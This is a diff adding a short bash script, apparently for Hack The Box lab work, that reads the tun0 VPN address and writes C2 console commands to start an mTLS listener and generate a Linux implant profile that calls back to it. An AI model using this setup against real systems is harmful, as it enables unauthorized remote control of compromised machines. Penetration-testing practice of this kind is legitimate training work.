@@ -1,0 +1,26 @@
+#!/usr/bin/env bash
+
+set -e
+
+LPORT=3773
+LPROTO="mtls"
+PROFILE_NAME="htb"
+
+# Get tun0 IP
+TUN_IP=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
+if [[ -z "$TUN_IP" ]]; then
+    echo "[!] Could not find tun0 IP. Make sure you're connected to the VPN."
+    exit 1
+fi
+
+echo "[+] tun0 IP: $TUN_IP"
+
+LISTENER_EXPECT_CMD=$"mtls -L $TUN_IP -l 9900
+profiles new --mtls $TUN_IP:9900 -e -l -o linux -f elf $PROFILE_NAME
+profiles generate $PROFILE_NAME"
+
+# PROFILE_EXPECT=
+# PROFILE_GENERATE=
+echo "$LISTENER_EXPECT_CMD" > mtls_listener.txt
+
+read_resource_expect.sh mtls_listener.txt
